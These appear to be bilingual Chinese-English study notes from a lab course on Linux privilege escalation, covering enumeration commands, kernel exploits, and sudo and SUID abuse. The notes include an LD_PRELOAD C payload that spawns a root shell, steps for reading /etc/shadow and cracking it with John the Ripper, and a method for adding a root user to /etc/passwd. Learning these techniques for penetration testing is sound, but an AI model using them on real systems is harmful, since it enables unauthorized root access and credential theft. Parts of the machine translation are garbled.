
# Step0:Enumeration枚举
### hostname 主机名
`hostname` 命令将返回目标计算机的主机名。尽管此值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息（例如，生产 SQL Server 的 .SQL-PROD-01）。
### uname -a
将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。在搜索任何可能导致权限提升的潜在内核漏洞时，这将非常有用。
### /proc/version /proc/版本
proc 文件系统 （procfs） 提供有关目标系统进程的信息。您会在许多不同的 Linux 版本上找到 proc，使其成为您武器库中必不可少的工具。
查看 `/proc/version` 可能会为您提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 GCC）。
### /etc/issue
还可以通过查看 `/etc/issue` 文件来识别系统。此文件通常包含有关操作系统的一些信息，但可以很容易地自定义或更改。在主题上，可以自定义或更改任何包含系统信息的文件。为了更清楚地了解系统，最好看看所有这些。
### ps Command
`ps` 命令是查看 Linux 系统上正在运行的进程的有效方法。在终端上键入 `ps` 将显示当前 shell 的进程。
`ps` （进程状态）的输出将显示以下内容;
PID：进程 ID（进程唯一）
TTY：用户使用的终端类型
TIME：进程使用的 CPU 时间量（这不是此进程运行的时间）
CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）
“ps”命令提供了一些有用的选项。
`ps -A` ： 查看所有正在运行的进程
`ps axjf` ：查看进程树（请参阅下面的树形成，直到 `ps axjf` 运行）
![[Pasted image 20231213200443.png]]
`ps aux` ： `aux` 选项将显示所有用户的进程 （a）、显示启动进程的用户 （u） 以及显示未附加到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在的漏洞。
### env 环境
`env` 命令将显示环境变量。
PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升。
### sudo -l
目标系统可以配置为允许用户以 root 权限运行某些（或全部）命令。 `sudo -l` 命令可用于列出用户可以使用 `sudo` 运行的所有命令。
### ls
在寻找潜在的权限提升向量时，请记住始终使用带有 `-la` 参数的 `ls` 命令。
### Id
`id` 命令将提供用户的权限级别和组成员身份的一般概述。
值得记住的是， `id` 命令还可用于获取另一个用户的相同信息
id \<username>
### /etc/passwd
读取 `/etc/passwd` 文件是发现系统上的用户的简单方法。
可以通过
`cat /etc/passwd | cut -d ":" -f 1`
来剪切结果更清晰的查看用户名

请记住，这将返回所有用户，其中一些是系统或服务用户，这些用户不是很有用。另一种方法是 grep for “home”，因为真实用户很可能将他们的文件夹放在“home”目录下。

### history
使用 `history` 命令查看早期的命令可以使我们对目标系统有所了解，并且尽管很少存储密码或用户名等信息。
### ifconfig
目标系统可能是另一个网络的枢轴点。 `ifconfig` 命令将向我们提供有关系统网络接口的信息。
可以使用 `ip route` 命令以查看存在哪些网络路由。
### netstat
在对现有接口和网络路由进行初步检查后，值得研究现有通信。 `netstat` 命令可以与多个不同的选项一起使用，以收集有关现有连接的信息。
`netstat -a` ：显示所有侦听端口和已建立的连接。
`netstat -at` 或 `netstat -au` 也可用于分别列出 TCP 或 UDP 协议。
`netstat -l` ：列出处于“侦听”模式的端口。这些端口已打开，并准备好接受传入连接。这可以与“t”选项一起使用，以仅列出使用 TCP 协议侦听的端口。
`netstat -s` ：按协议列出网络使用情况统计信息，这也可以与 `-t` 或 `-u` 选项一起使用，以将输出限制为特定协议。
`netstat -tp` ：列出带有服务名称和 PID 信息的连接。
这也可以与 `-l` 选项一起使用，以列出侦听端口
如果看到“PID/程序名称”列是空的，是因为此进程由另一个用户拥有。
`netstat -i` ：显示接口统计信息。
可能在博客文章、文章和课程中最常看到的 `netstat` 用法是 `netstat -ano` ，可以细分如下;
`-a` ： 显示所有套接字
`-n` ：不解析名称
`-o` ： 显示计时器
### find Command
在目标系统中搜索重要信息和潜在的权限提升向量可能会很有成效。内置的“find”命令很有用，值得保留在您的武器库中。
以下是“find”命令的一些有用示例。

`find . -name flag1.txt` ： 在当前目录下找到名为“flag1.txt”的文件
`find /home -name flag1.txt` ： 在 /home 目录中查找文件名 “flag1.txt”
`find / -type d -name config` ： 在“/”下找到名为 config 的目录
`find / -type f -perm 0777` ：查找具有 777 权限的文件（所有用户可读、可写和可执行的文件）
`find / -perm a=x` ： 查找可执行文件
`find /home -user frank` ： 在“/home”下查找用户“frank”的所有文件
`find / -mtime 10` ：查找最近 10 天内修改的文件
`find / -atime 10` ：查找过去 10 天内访问的文件
`find / -cmin -60` ：查找过去一小时（60 分钟）内更改的文件
`find / -amin -60` ：查找过去一小时（60 分钟）内的文件访问次数
`find / -size 50M` ：查找大小为 50 MB 的文件
此命令还可以与 （+） 和 （-） 符号一起使用，以指定大于或小于给定大小的文件。
需要注意的是，“find”命令往往会产生错误，有时会使输出难以阅读。这就是为什么使用带有“-type f ==2>/dev/null==”的“find”命令将错误重定向到“/dev/null”并获得更清晰的输出是明智的。

可以写入或执行的文件夹和文件：
`find / -writable -type d 2>/dev/null` ： 查找全局可写的文件夹
`find / -perm -222 -type d 2>/dev/null` ： 查找全局可写的文件夹
`find / -perm -o w -type d 2>/dev/null` ： 查找全局可写的文件夹
`find / -perm -o x -type d 2>/dev/null` ： 查找全局可执行文件夹

查找开发工具和支持的语言：
- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

查找特定文件权限：
下面是一个简短的示例，用于查找设置了 SUID 位的文件。SUID 位允许使用拥有该文件的帐户的权限级别运行文件，而不是使用运行该文件的帐户的权限级别运行文件。
`find / -perm -u=s -type f 2>/dev/null` ：查找带有SUID位的文件，这允许我们以比当前用户更高的权限级别运行文件。

# Privilege Escalation: Kernel Exploits
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.  
理想情况下，权限提升会导致 root 权限。有时，只需利用现有漏洞即可实现此目的，或者在某些情况下，只需访问具有更多权限、信息或访问权限的其他用户帐户即可实现。

  

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.  
除非单个漏洞导致 root shell，否则权限提升过程将依赖于错误配置和松散权限。

  

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.  
Linux 系统上的内核管理组件（如系统上的内存）与应用程序之间的通信。此关键功能要求内核具有特定权限;因此，成功利用此漏洞可能会获得 root 权限。

  

The Kernel exploit methodology is simple;  
内核漏洞利用方法很简单;

1. Identify the kernel version 确定内核版本
2. Search and find an exploit code for the kernel version of the target system  
    搜索并查找目标系统内核版本的漏洞利用代码
3. Run the exploit  运行漏洞利用

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.  
虽然看起来很简单，但请记住，失败的内核漏洞可能会导致系统崩溃。在尝试内核漏洞利用之前，请确保此潜在结果在渗透测试参与的范围内是可以接受的。

  

**Research sources:  研究来源：**  

1. Based on your findings, you can use Google to search for an existing exploit code.  
    根据您的发现，您可以使用 Google 搜索现有的漏洞利用代码。
2. Sources such as [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can also be useful.  
    诸如 [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) 之类的来源也很有用。
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).  
    另一种选择是使用类似 LES（Linux 漏洞利用建议器）的脚本，但请记住，这些工具可能会生成误报（报告不影响目标系统的内核漏洞）或漏报（尽管内核易受攻击，但不报告任何内核漏洞）。

**Hints/Notes: 提示/注意事项：**

1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit  
    在 Google、Exploit-db 或 searchsploit 上搜索漏洞时，内核版本过于具体
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.  
    在启动漏洞利用代码之前，请确保您了解它是如何工作的。某些漏洞利用代码可能会对操作系统进行更改，使其在进一步使用时不安全，或者对系统进行不可逆的更改，从而在以后产生问题。当然，在实验室或 CTF 环境中，这些可能不是大问题，但在真正的渗透测试活动中，这些都是绝对禁忌。
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.  
    某些漏洞在运行后可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。
4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.  
    您可以分别使用 `SimpleHTTPServer` Python 模块和 `wget` 将漏洞利用代码从计算机传输到目标系统。

# Privilege Escalation: Sudo
The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.  
缺省情况下，sudo 命令允许您以 root 权限运行程序。在某些情况下，系统管理员可能需要为普通用户提供一些权限的灵活性。例如，初级 SOC 分析师可能需要定期使用 Nmap，但不会被清除以获得完全 root 访问权限。在这种情况下，系统管理员可以允许此用户仅以 root 权限运行 Nmap，同时在系统的其余部分保持其常规权限级别。

Any user can check its current situation related to root privileges using the `sudo -l` command.  
任何用户都可以使用 `sudo -l` 命令检查其与 root 权限相关的当前情况。

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.  
[https://gtfobins.github.io/](https://gtfobins.github.io/) 是一个有价值的来源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。

**Leverage application functions 利用应用程序功能**  

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.  
在此上下文中，某些应用程序不会有已知的漏洞利用。您可能会看到这样的应用程序是 Apache2 服务器。

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).  
在这种情况下，我们可以使用“黑客”来利用应用程序的功能泄露信息。如下图所示，Apache2 有一个选项支持加载替代配置文件 （ `-f` ： 指定备用 ServerConfigFile）。

![](https://i.imgur.com/rNpbbL8.png)  

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.  
使用此选项加载 `/etc/shadow` 文件将导致包含 `/etc/shadow` 文件第一行的错误消息。

**Leverage LD_PRELOAD 杠杆LD_PRELOAD**

On some systems, you may see the LD_PRELOAD environment option.  
在某些系统上，您可能会看到“LD_PRELOAD环境”选项。

![](https://i.imgur.com/gGstS69.png)  

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  
LD_PRELOAD 是一个允许任何程序使用共享库的功能。这篇博文将让您了解 LD_PRELOAD 的功能。如果启用了“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行。请注意，如果真实用户 ID 与有效用户 ID 不同，则LD_PRELOAD选项将被忽略。  

The steps of this privilege escalation vector can be summarized as follows;  
此权限提升向量的步骤可以总结如下;

1. Check for LD_PRELOAD (with the env_keep option)  
    检查LD_PRELOAD（使用env_keep选项）
2. Write a simple C code compiled as a share object (.so extension) file  
    编写编译为共享对象（.so 扩展名）文件的简单 C 代码
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file  
    使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序

The C code will simply spawn a root shell and can be written as follows;  
C 代码将简单地生成一个根 shell，可以写成如下;

#include <stdio.h> #include < stdio.h>  
#include <sys/types.h> #include < sys/types.h>  
#include <stdlib.h> #include < stdlib.h>  
  
void _init() { 无效 _init（） {  
unsetenv("LD_PRELOAD"); unsetenv（“LD_PRELOAD”）;  
setgid(0); setgid（0）;  
setuid(0); setuid（0）;  
system("/bin/bash"); 系统（“/bin/bash”）;  
}  

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;  
我们可以将此代码保存为 shell.c，并使用以下参数使用 gcc 将其编译为共享对象文件;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![](https://i.imgur.com/HxbszMW.png)  

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.  
现在，我们可以在启动用户可以使用 sudo 运行的任何程序时使用此共享对象文件。在我们的例子中，可以使用 Apache2、find 或几乎任何我们可以用 sudo 运行的程序。

We need to run the program by specifying the LD_PRELOAD option, as follows;  
我们需要通过指定 LD_PRELOAD 选项来运行程序，如下所示;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.  
这将导致具有 root 权限的 shell 生成。

![](https://i.imgur.com/1YwARyZ.png)
# Privilege Escalation: SUID
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
许多 Linux 权限控制都依赖于控制用户和文件的交互。这是通过权限完成的。到目前为止，您已经知道文件可以具有读取、写入和执行权限。这些权限授予用户在其权限级别内。这随着 SUID（设置用户标识）和 SGID（设置组标识）而改变。它们允许分别以文件所有者或组所有者的权限级别执行文件。  
  
You will notice these files have an “s” bit set showing their special permission level.  
您会注意到这些文件设置了一个“s”位，显示其特殊权限级别。  
  
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.  
`find / -type f -perm -04000 -ls 2>/dev/null` 将列出设置了 SUID 或 SGID 位的文件。

![](https://i.imgur.com/fJEeZ4m.png)

A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).  
一个好的做法是将此列表中的可执行文件与 go awayBins （ [https://gtfobins.github.io](https://gtfobins.github.io/) ） 进行比较。单击SUID按钮将过滤设置SUID位时已知可利用的二进制文件（您也可以将此链接用于预过滤列表 [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid) ）。

  

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.  
上面的列表显示 nano 设置了 SUID 位。不幸的是，go awaybins 并没有为我们提供轻松的胜利。在现实生活中的典型特权升级场景中，我们需要找到中间步骤，以帮助我们利用任何微小的发现。

  

  

![](https://i.imgur.com/rSRTn5v.png)  

  

**Note**: The attached VM has another binary with SUID other than `nano`.  
注意：附加的虚拟机具有除 `nano` 之外的 SUID 的另一个二进制文件。  

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  
为 nano 文本编辑器设置的 SUID 位允许我们使用文件所有者的权限创建、编辑和读取文件。Nano 归 root 所有，这可能意味着我们可以以比当前用户更高的权限级别读取和编辑文件。在此阶段，我们有两个权限提升的基本选项：读取 `/etc/shadow` 文件或将用户添加到 `/etc/passwd` 。  
  
Below are simple steps using both vectors.  
以下是使用这两种向量的简单步骤。  
  
reading the `/etc/shadow` file  
读取 `/etc/shadow` 文件  
  
We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.  
我们看到 nano 文本编辑器通过运行 `find / -type f -perm -04000 -ls 2>/dev/null` 命令设置了 SUID 位。  
  
`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.  
`nano /etc/shadow` 将打印 `/etc/shadow` 文件的内容。我们现在可以使用 unshadow 工具创建一个可被开膛手 John 破解的文件。为此，unshadow 需要 `/etc/shadow` 和 `/etc/passwd` 文件。

![](https://i.imgur.com/DAWxbJD.png)  

The unshadow tool’s usage can be seen below;  
unshadow 工具的用法可以在下面看到;  
`unshadow passwd.txt shadow.txt > passwords.txt`  

![](https://i.imgur.com/6cHBAr1.png)  

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit [https://tryhackme.com/room/johntheripper0](https://tryhackme.com/room/johntheripper0)  
有了正确的单词表和一点运气，开膛手约翰可以以明文形式返回一个或多个密码。有关开膛手约翰的更详细房间，您可以访问 [https://tryhackme.com/room/johntheripper0](https://tryhackme.com/room/johntheripper0)

  

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:  
另一种选择是添加具有 root 权限的新用户。这将帮助我们规避繁琐的密码破解过程。以下是一个简单的方法：

  

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.  
我们将需要我们希望新用户拥有的密码的哈希值。这可以在 Kali Linux 上使用 openssl 工具快速完成。

  

![](https://i.imgur.com/bkOGaHY.png)  

  

We will then add this password with a username to the `/etc/passwd` file.  
然后，我们将此密码和用户名添加到 `/etc/passwd` 文件中。

  

![](https://i.imgur.com/huGoEtj.png)

  

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.  
添加用户后（请注意如何使用 `root:/bin/bash` 提供 root shell），我们将需要切换到此用户，并希望应该具有 root 权限。

  

![](https://i.imgur.com/HZcWGhi.png)